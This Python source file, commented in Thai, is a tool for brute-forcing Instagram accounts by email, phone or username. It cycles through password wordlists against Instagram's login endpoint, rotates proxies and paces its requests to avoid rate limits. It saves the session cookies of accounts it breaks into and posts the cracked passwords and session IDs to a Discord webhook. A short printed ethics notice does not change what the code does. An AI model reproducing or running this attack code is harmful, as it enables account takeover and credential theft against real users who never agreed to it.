#!/usr/bin/env python3
"""
🔓 Instagram Brute Force Login
รองรับ email/phone/username พร้อม session extraction
"""

import time
import json
import random
import requests
from datetime import datetime
from typing import List, Dict, Optional, Tuple
from pathlib import Path

# Import existing modules
from modules.proxy_manager import ProxyManager
from modules.browser_api_manager import BrowserAPIManager
from webhook.discord_notify import send_discord_alert

class InstagramBruteForce:
    """Instagram Brute Force Login with Session Extraction"""
    
    def __init__(self, config_file: str = "brute_config.json"):
        self.config = self.load_config(config_file)
        self.proxy_manager = ProxyManager()
        self.browser_api = BrowserAPIManager()
        
        # Session storage
        self.successful_sessions = []
        self.failed_attempts = []
        
        # Rate limiting
        self.request_delay = self.config.get('request_delay', 3)
        self.max_attempts_per_target = self.config.get('max_attempts', 10)
        self.max_concurrent = self.config.get('max_concurrent', 3)
        
        # Headers for Instagram API
        self.headers = {
            'User-Agent': 'Instagram 219.0.0.12.117 Android',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'X-IG-App-ID': '936619743392459',
            'X-IG-WWW-Claim': '0',
            'X-Requested-With': 'XMLHttpRequest',
            'X-CSRFToken': '',
            'X-Instagram-AJAX': '1'
        }
    
    def load_config(self, config_file: str) -> Dict:
        """โหลด configuration file"""
        default_config = {
            "request_delay": 3,
            "max_attempts": 10,
            "max_concurrent": 3,
            "use_proxy": True,
            "use_browser_api": True,
            "wordlists": ["common_passwords.txt", "instagram_passwords.txt"],
            "targets": [],
            "output_file": "brute_results.json",
            "session_output": "extracted_sessions.json"
        }
        
        try:
            with open(config_file, 'r', encoding='utf-8') as f:
                user_config = json.load(f)
                default_config.update(user_config)
        except FileNotFoundError:
            # สร้างไฟล์ config เริ่มต้น
            with open(config_file, 'w', encoding='utf-8') as f:
                json.dump(default_config, f, indent=2, ensure_ascii=False)
            print(f"📝 สร้าง config file: {config_file}")
        
        return default_config
    
    def load_wordlist(self, wordlist_file: str) -> List[str]:
        """โหลด password wordlist"""
        passwords = []
        
        if not Path(wordlist_file).exists():
            # สร้าง default wordlist
            default_passwords = [
                "123456", "password", "123456789", "12345678", "12345",
                "1234567", "1234567890", "qwerty", "abc123", "111111",
                "123123", "admin", "letmein", "welcome", "monkey",
                "password123", "admin123", "qwerty123", "123qwe", "1q2w3e",
                "instagram", "insta123", "love", "family", "friends"
            ]
            
            with open(wordlist_file, 'w', encoding='utf-8') as f:
                for pwd in default_passwords:
                    f.write(f"{pwd}\n")
            
            print(f"📝 สร้าง default wordlist: {wordlist_file}")
            return default_passwords
        
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"❌ Error loading wordlist {wordlist_file}: {e}")
        
        return passwords
    
    def get_csrf_token(self, session: requests.Session) -> Optional[str]:
        """ดึง CSRF token จาก Instagram"""
        try:
            response = session.get('https://www.instagram.com/', timeout=10)
            if 'csrf_token' in response.text:
                # Extract CSRF token from page
                start = response.text.find('"csrf_token":"') + 14
                end = response.text.find('"', start)
                return response.text[start:end]
        except Exception as e:
            print(f"❌ Error getting CSRF token: {e}")
        
        return None
    
    def attempt_login(self, target: str, password: str, session: requests.Session) -> Tuple[bool, Dict]:
        """พยายาม login และดึง session"""
        result = {
            'target': target,
            'password': password,
            'success': False,
            'session_id': None,
            'user_id': None,
            'timestamp': datetime.now().isoformat(),
            'error': None
        }
        
        try:
            # ดึง CSRF token
            csrf_token = self.get_csrf_token(session)
            if not csrf_token:
                result['error'] = 'Failed to get CSRF token'
                return False, result
            
            # Update headers with CSRF token
            login_headers = self.headers.copy()
            login_headers['X-CSRFToken'] = csrf_token
            
            # Login payload
            login_data = {
                'username': target,
                'password': password,
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            # ทำการ login
            login_url = 'https://www.instagram.com/accounts/login/ajax/'
            response = session.post(
                login_url,
                data=login_data,
                headers=login_headers,
                timeout=15
            )
            
            # ตรวจสอบผลลัพธ์
            if response.status_code == 200:
                try:
                    json_response = response.json()
                    
                    if json_response.get('authenticated'):
                        # Login สำเร็จ - ดึง session
                        sessionid = None
                        user_id = json_response.get('userId')
                        
                        # ดึง sessionid จาก cookies
                        for cookie in session.cookies:
                            if cookie.name == 'sessionid':
                                sessionid = cookie.value
                                break
                        
                        if sessionid:
                            result.update({
                                'success': True,
                                'session_id': sessionid,
                                'user_id': user_id,
                                'cookies': dict(session.cookies)
                            })
                            
                            print(f"✅ SUCCESS: {target} | Password: {password}")
                            print(f"   Session ID: {sessionid[:20]}...")
                            
                            # Send Discord notification for successful login
                            try:
                                discord_message = f"🎯 **BRUTE FORCE SUCCESS!**\n"
                                discord_message += f"**Target:** {target}\n"
                                discord_message += f"**Password:** ||{password}||\n"
                                discord_message += f"**Session ID:** {sessionid[:20]}...\n"
                                discord_message += f"**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                                send_discord_alert(discord_message)
                            except Exception as e:
                                print(f"Failed to send Discord notification: {e}")
                            
                            return True, result
                        else:
                            result['error'] = 'Login successful but no sessionid found'
                    
                    else:
                        # Login ไม่สำเร็จ
                        error_msg = json_response.get('message', 'Login failed')
                        result['error'] = error_msg
                        
                        if 'rate limited' in error_msg.lower():
                            print(f"⚠️ RATE LIMITED: {target}")
                            time.sleep(60)  # รอ 1 นาที
                        
                except json.JSONDecodeError:
                    result['error'] = f'Invalid JSON response: {response.text[:100]}'
            
            else:
                result['error'] = f'HTTP {response.status_code}: {response.text[:100]}'
        
        except requests.exceptions.Timeout:
            result['error'] = 'Request timeout'
        except requests.exceptions.RequestException as e:
            result['error'] = f'Request error: {str(e)}'
        except Exception as e:
            result['error'] = f'Unexpected error: {str(e)}'
        
        return False, result
    
    def brute_force_target(self, target: str, passwords: List[str]) -> Dict:
        """Brute force ใน target เดียว"""
        print(f"\n🎯 Starting brute force: {target}")
        print(f"📝 Passwords to try: {len(passwords)}")
        
        results = {
            'target': target,
            'started_at': datetime.now().isoformat(),
            'total_attempts': 0,
            'success': False,
            'session_data': None,
            'attempts': []
        }
        
        # สร้าง session ใหม่
        session = requests.Session()
        
        # ใช้ proxy ถ้าเปิดใช้งาน
        if self.config.get('use_proxy'):
            proxy = self.proxy_manager.get_random_proxy()
            if proxy:
                session.proxies = proxy
                print(f"🌐 Using proxy: {proxy}")
        
        attempt_count = 0
        
        for password in passwords:
            if attempt_count >= self.max_attempts_per_target:
                print(f"⚠️ Reached max attempts ({self.max_attempts_per_target}) for {target}")
                break
            
            attempt_count += 1
            results['total_attempts'] = attempt_count
            
            print(f"🔑 Attempt {attempt_count}: {target} | {password}")
            
            # พยายาม login
            success, attempt_result = self.attempt_login(target, password, session)
            results['attempts'].append(attempt_result)
            
            if success:
                results['success'] = True
                results['session_data'] = attempt_result
                self.successful_sessions.append(attempt_result)
                break
            else:
                self.failed_attempts.append(attempt_result)
                print(f"❌ Failed: {attempt_result.get('error', 'Unknown error')}")
            
            # Delay ระหว่างการพยายาม
            if attempt_count < len(passwords):
                delay = self.request_delay + random.uniform(0, 2)
                print(f"⏳ Waiting {delay:.1f} seconds...")
                time.sleep(delay)
        
        results['completed_at'] = datetime.now().isoformat()
        return results
    
    def run_brute_force(self, targets: List[str] = None, wordlists: List[str] = None) -> Dict:
        """เรียกใช้ brute force หลาย targets"""
        if not targets:
            targets = self.config.get('targets', [])
        
        if not wordlists:
            wordlists = self.config.get('wordlists', ['common_passwords.txt'])
        
        # โหลด passwords จาก wordlists
        all_passwords = []
        for wordlist in wordlists:
            passwords = self.load_wordlist(wordlist)
            all_passwords.extend(passwords)
        
        # ลบ duplicates และ shuffle
        all_passwords = list(set(all_passwords))
        random.shuffle(all_passwords)
        
        print(f"🚀 Starting Instagram Brute Force")
        print(f"📋 Targets: {len(targets)}")
        print(f"🔑 Total passwords: {len(all_passwords)}")
        print(f"⏱️ Delay: {self.request_delay} seconds")
        
        # เริ่มการ brute force
        campaign_results = {
            'started_at': datetime.now().isoformat(),
            'targets': targets,
            'total_passwords': len(all_passwords),
            'results': [],
            'summary': {
                'total_targets': len(targets),
                'successful_logins': 0,
                'total_attempts': 0
            }
        }
        
        for target in targets:
            target_result = self.brute_force_target(target, all_passwords)
            campaign_results['results'].append(target_result)
            
            # Update summary
            campaign_results['summary']['total_attempts'] += target_result['total_attempts']
            if target_result['success']:
                campaign_results['summary']['successful_logins'] += 1
        
        campaign_results['completed_at'] = datetime.now().isoformat()
        
        # บันทึกผลลัพธ์
        self.save_results(campaign_results)
        
        return campaign_results
    
    def save_results(self, results: Dict):
        """บันทึกผลลัพธ์ลงไฟล์"""
        # บันทึกผลลัพธ์ทั้งหมด
        output_file = self.config.get('output_file', 'brute_results.json')
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        # บันทึกเฉพาะ successful sessions
        if self.successful_sessions:
            session_file = self.config.get('session_output', 'extracted_sessions.json')
            session_data = {
                'extracted_at': datetime.now().isoformat(),
                'total_sessions': len(self.successful_sessions),
                'sessions': self.successful_sessions
            }
            
            with open(session_file, 'w', encoding='utf-8') as f:
                json.dump(session_data, f, indent=2, ensure_ascii=False)
            
            print(f"\n✅ Successful sessions saved: {session_file}")
            print(f"🔑 Total sessions extracted: {len(self.successful_sessions)}")
        
        print(f"📁 Full results saved: {output_file}")
        
        # Send Discord completion notification
        try:
            summary = results.get('summary', {})
            discord_message = f"📊 **BRUTE FORCE CAMPAIGN COMPLETED**\n"
            discord_message += f"**Targets:** {summary.get('total_targets', 0)}\n"
            discord_message += f"**Successful Logins:** {summary.get('successful_logins', 0)}\n"
            discord_message += f"**Total Attempts:** {summary.get('total_attempts', 0)}\n"
            discord_message += f"**Sessions Extracted:** {len(self.successful_sessions)}\n"
            discord_message += f"**Completed:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            send_discord_alert(discord_message)
        except Exception as e:
            print(f"Failed to send Discord completion notification: {e}")
    
    def add_target(self, identifier: str, identifier_type: str = "auto"):
        """เพิ่ม target ใหม่"""
        if identifier_type == "auto":
            if "@" in identifier:
                identifier_type = "email"
            elif identifier.isdigit() or identifier.startswith("+"):
                identifier_type = "phone"
            else:
                identifier_type = "username"
        
        target_info = {
            'identifier': identifier,
            'type': identifier_type,
            'added_at': datetime.now().isoformat()
        }
        
        if 'targets' not in self.config:
            self.config['targets'] = []
        
        # ตรวจสอบว่ามีอยู่แล้วหรือไม่
        existing = [t for t in self.config['targets'] if t.get('identifier') == identifier]
        if not existing:
            self.config['targets'].append(target_info)
            print(f"✅ Added target: {identifier} ({identifier_type})")
        else:
            print(f"⚠️ Target already exists: {identifier}")
    
    def create_sample_data(self):
        """สร้างข้อมูลตัวอย่างสำหรับทดสอบ"""
        # สร้าง sample targets
        sample_targets = [
            "test_account_1",
            "demo@example.com", 
            "+66812345678"
        ]
        
        for target in sample_targets:
            self.add_target(target)
        
        # สร้าง sample wordlist
        sample_passwords = [
            "password", "123456", "admin", "test123",
            "instagram", "demo123", "sample", "12345678"
        ]
        
        with open("sample_passwords.txt", "w", encoding="utf-8") as f:
            for pwd in sample_passwords:
                f.write(f"{pwd}\n")
        
        print("📝 Created sample data:")
        print(f"  - Targets: {len(sample_targets)}")
        print(f"  - Passwords: {len(sample_passwords)}")


def main():
    """Main function สำหรับทดสอบ"""
    print("🔓 Instagram Brute Force Tool")
    print("=" * 50)
    
    brute_force = InstagramBruteForce()
    
    # สร้างข้อมูลตัวอย่าง
    brute_force.create_sample_data()
    
    # เพิ่ม targets (ใช้เฉพาะบัญชีทดสอบของตัวเอง)
    print("\n⚠️ ETHICAL NOTICE:")
    print("- ใช้เฉพาะกับบัญชีของตัวเองหรือบัญชีที่ได้รับอนุญาต")
    print("- ไม่ใช้สำหรับการโจมตีบัญชีคนอื่น")
    print("- รับผิดชอบการใช้งานด้วยตัวเอง")
    
    # ตัวอย่างการใช้งาน (ปิดไว้ เพื่อความปลอดภัย)
    print("\n📖 ตัวอย่างการใช้งาน:")
    print("brute_force.add_target('your_test_account')")
    print("brute_force.run_brute_force()")


if __name__ == "__main__":
    main()
